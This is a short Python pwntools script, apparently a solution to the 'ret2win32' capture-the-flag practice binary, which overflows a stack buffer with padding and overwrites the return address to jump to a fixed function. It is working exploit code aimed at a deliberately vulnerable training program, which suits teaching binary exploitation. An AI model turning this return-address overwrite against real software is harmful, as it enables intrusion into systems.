from pwn import * 
 
p = process('./ret2win32') 
sys_addr = 0x0804862C 
payload = 'A'*0x28 + 'A'*0x04 + p32(sys_addr) 
p.sendlineafter('> ',payload) 
p.interactive()
